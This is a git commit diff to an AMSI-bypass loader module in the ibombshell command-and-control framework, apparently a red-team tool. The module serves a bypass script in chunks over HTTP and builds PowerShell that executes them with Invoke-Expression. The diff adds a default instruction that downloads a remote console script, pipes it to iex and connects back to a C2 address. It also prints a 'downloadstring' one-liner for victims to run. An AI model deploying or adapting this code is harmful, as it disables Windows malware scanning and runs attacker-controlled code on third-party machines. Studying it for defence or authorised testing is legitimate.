d093cb42cbe081ab802eef962e425f753aa2f659
pilarclares <pilar.clarescervantes.practicas@telefonica.com>
2024-08-07 10:53:40 +0200

    Loader with instruction without warrior

--- ibombshell c2/modules/bypass/amsi/amsi-loader-numlines.py
+++ ibombshell c2/modules/bypass/amsi/amsi-loader-numlines.py
@@ -9,10 +9,10 @@ from module import Module
 FUNCTION = ''
 BYPASS_BLOCKS = []
 LAST_INDEX = 0
-FILE_SENDED = False
-FILE_SENDED_ERROR = False
+BYPASS_SENT = False
+BYPASS_SENT_ERROR = False
 
-class SendFile(BaseHTTPRequestHandler):
+class SendBypass(BaseHTTPRequestHandler):
     # Para evitar logs en la pantalla
     def log_message(self, format, *args):
         return
@@ -40,7 +40,7 @@ class SendFile(BaseHTTPRequestHandler):
         self.wfile.write(response)
 
     def do_POST(self):
-        global FILE_SENDED, FILE_SENDED_ERROR, LAST_INDEX
+        global BYPASS_SENT, BYPASS_SENT_ERROR, LAST_INDEX
 
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
@@ -56,15 +56,16 @@ class SendFile(BaseHTTPRequestHandler):
 
             if recv == 'Received':
                 LAST_INDEX += 1
-            elif recv == 'Error':
-                FILE_SENDED_ERROR = True
+            elif recv.startswith('Error'):
+                print_error(recv)
+                BYPASS_SENT_ERROR = True
             else:
                 print_info(recv)
-                FILE_SENDED = True
+                BYPASS_SENT = True
 
         except Exception as e:
             print_error(f"Error reading results at file upload: {e}")
-            FILE_SENDED_ERROR = True
+            BYPASS_SENT_ERROR = True
 
     def do_HEAD(self):
         self._set_response()
@@ -78,18 +79,19 @@ class CustomModule(Module):
         }
 
         options = {
-            "warrior": [None, "Warrior in war. If none is specified, it will provide a command to download a script with AMSI bypass functionality.", False],
             "ip": ["192.168.56.5", "Local IP (Where the file is located)", True],
-            "port": ["8082", "Listener port", True],
-            "destination": [None, "Directory with the files", True],
+            "port": ["8082", "Server port", True],
+            "destination": ["$env:TEMP\\amlo", "Directory with the files", True],
             "filePath": ["/home/kali/rm.ps1", "Path to the bypass file", True],
-            "lineNumbers": ["/home/kali/linesnumber.txt", "Path to the file containing line numbers for blocks", True]
+            "lineNumbers": ["/home/kali/linesnumber.txt", "Path to the file containing line numbers for blocks", True],
+            "instruction": ["(iwr -UseBasicParsing -uri 'https://raw.githubusercontent.com/Telefonica/ibombshell/master/console').Content | iex; console -Silently -uriConsole http://192.168.56.5:8080", 
+            		"Instruction to execute after bypass AMSI", False]
         }
 
         super(CustomModule, self).__init__(information, options)
     
     def run_module(self):
-        global FILE_SENDED, FILE_SENDED_ERROR, BYPASS_BLOCKS, LAST_INDEX, FUNCTION
+        global BYPASS_SENT, BYPASS_SENT_ERROR, BYPASS_BLOCKS, LAST_INDEX, FUNCTION
 
         function = """
         function chargeFiles {
@@ -106,9 +108,9 @@ class CustomModule(Module):
                 $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Received'}
             }
             catch {
-                $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Error'}
-                Write-Host "Error executing commands from the file $filePath."
-                throw $_.Exception
+                $errorMessage = "Error sending the file $destination."
+                $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results=$errorMessage}
+                Write-Host $errorMessage
             }
         }
 
@@ -119,12 +121,12 @@ class CustomModule(Module):
             )
 
             if (-not $directory -and -not $files) {
-                return "At least one of the parameters `$directory or `$files must be provided."
+                return "Error: At least one of the parameters `$directory or `$files must be provided."
             }
 
             if ($directory) {
                 if (-Not (Test-Path $directory)) {
-                    return "The directory $directory does not exist."
+                    return "Error: The directory $directory does not exist."
                 }
 
                 $files = Get-ChildItem -Path $directory -Recurse -File | Select-Object -ExpandProperty FullName
@@ -132,15 +134,14 @@ class CustomModule(Module):
 
             foreach ($filePath in $files) {
                 if (-Not (Test-Path $filePath)) {
-                    return "The file $filePath does not exist."
+                    return "Error: The file $filePath does not exist."
                 }
 
                 try {
                     $content = Get-Content -Path $filePath -Raw
                     Invoke-Expression $content -ErrorAction Stop | Out-Null
                 } catch {
-                    Write-Host "Error executing commands from the file $filePath."
-                    throw $_.Exception
+                    return "Error executing commands from the file $filePath."
                 }
             }
 
@@ -150,7 +151,7 @@ class CustomModule(Module):
                 return "Success: AMSI bypassed successfully."
             } catch {
                 if ($_.Exception.Message -like '*malintencionados*' -or $_.Exception.Message -like '*malicious*') {
-                    return "Error: AMSI is still active."
+                    return "Fail: AMSI is still active."
                 } else {
                     return "Success: AMSI bypassed successfully."
                 }
@@ -158,70 +159,76 @@ class CustomModule(Module):
         }
         """
         
-        with open(self.args["filePath"], 'r') as file:
-            lines = file.readlines()
-        
-        sourceUri = f"http://{self.args['ip']}:{self.args['port']}/"
-        destination = self.args["destination"]
+        try:
+            with open(self.args["filePath"], 'r') as file:
+                lines = file.readlines()
+            
+            sourceUri = f"http://{self.args['ip']}:{self.args['port']}/"
+            destination = self.args["destination"]
 
-        function += f"$directoryPath = '{destination}'; $sourceUri = '{sourceUri}'\n"
-        function += """
-        if (Test-Path -Path $directoryPath) {
-            Remove-Item -Path $directoryPath -Recurse -Force
-        }
-        New-Item -Path $directoryPath -ItemType Directory | Out-Null
-        """
-        
-        auxLine = 0
-        with open(self.args["lineNumbers"], 'r') as metadata:
-            for index, lineNumber in enumerate(metadata, start=0):
-                lineNumber = lineNumber.strip()
-                try:
-                    lineNumber = int(lineNumber)
-                except ValueError:
-                    print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
-                    return
-                
-                if len(lines) < lineNumber:
-                    print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
-                    return
+            function += f'$directoryPath = "{destination}"; $sourceUri = "{sourceUri}"\n'
+            function += """
+            if (Test-Path -Path $directoryPath) {
+                Remove-Item -Path $directoryPath -Recurse -Force
+            }
+            New-Item -Path $directoryPath -ItemType Directory | Out-Null
+            """
+            
+            auxLine = 0
+            with open(self.args["lineNumbers"], 'r') as metadata:
+                for index, lineNumber in enumerate(metadata, start=0):
+                    lineNumber = lineNumber.strip()
+                    try:
+                        lineNumber = int(lineNumber)
+                    except ValueError:
+                        print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
+                        return
+                    
+                    if len(lines) < lineNumber:
+                        print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
+                        return
 
-                command = ''.join(lines[auxLine:lineNumber])
+                    command = ''.join(lines[auxLine:lineNumber])
+                    BYPASS_BLOCKS.append(command)
+                    function += f'chargeFiles -sourceUri {sourceUri}block -destination {destination}\\part{index}\n'
+                    auxLine = lineNumber
+                    
+            if auxLine < len(lines):
+                command = ''.join(lines[auxLine:])
                 BYPASS_BLOCKS.append(command)
+                index += 1
                 function += f'chargeFiles -sourceUri {sourceUri}block -destination {destination}\\part{index}\n'
-                auxLine = lineNumber
-                
-        if auxLine < len(lines):
-            command = ''.join(lines[auxLine:])
-            BYPASS_BLOCKS.append(command)
-            function += f'chargeFiles -sourceUri {sourceUri}block -destination {destination}\\part{index}\n'
-                
-        function += f"$result = loader -directory {destination}\n"
-        function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n"
-        function += f"Remove-Item -Path {destination} -Recurse -Force\n"
+                    
+            function += f"$result = loader -directory {destination}\n"
+            function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n"
+            #function += f"Remove-Item -Path {destination} -Recurse -Force\n"
 
-        listener = Thread(target=self.run, name='amsi-loader listener', kwargs={'address': self.args["ip"], 'port': int(self.args["port"])})
-        print_info("Sending file... waiting for an answer from the warrior")
-        listener.start()
+            if self.args["instruction"]:
+                function += self.args["instruction"]
 
-        if self.args["warrior"]:
-            super(CustomModule, self).run(function)
-        else:
             FUNCTION = function
+            
+            server = Thread(target=self.run, name='amsi-loader server', kwargs={'address': self.args["ip"], 'port': int(self.args["port"])})
+            server.start()
+
             print_ok(f"Everything is ready. To bypass AMSI execute this command:\niex (new-object net.webclient).downloadstring('{sourceUri}')")
 
-        while not FILE_SENDED and not FILE_SENDED_ERROR:
-            pass
+            while not BYPASS_SENT and not BYPASS_SENT_ERROR:
+                pass
 
-        if FILE_SENDED_ERROR:
-            print_error('An error occurred while sending the script.')
+        except Exception as e:
+            print_error("An error ocurred: " + e)
+        finally:
 
-        FILE_SENDED = False
-        FILE_SENDED_ERROR = False
-        BYPASS_BLOCKS = []
-        LAST_INDEX = 0
+            if BYPASS_SENT_ERROR:
+                print_error('An error occurred while sending the script.')
 
-    def run(self, server_class=HTTPServer, handler_class=SendFile, address=None, port=9999):
+            BYPASS_SENT = False
+            BYPASS_SENT_ERROR = False
+            BYPASS_BLOCKS = []
+            LAST_INDEX = 0
+
+    def run(self, server_class=HTTPServer, handler_class=SendBypass, address=None, port=8082):
         try:
             server_address = (address, port)
             httpd = server_class(server_address, handler_class)
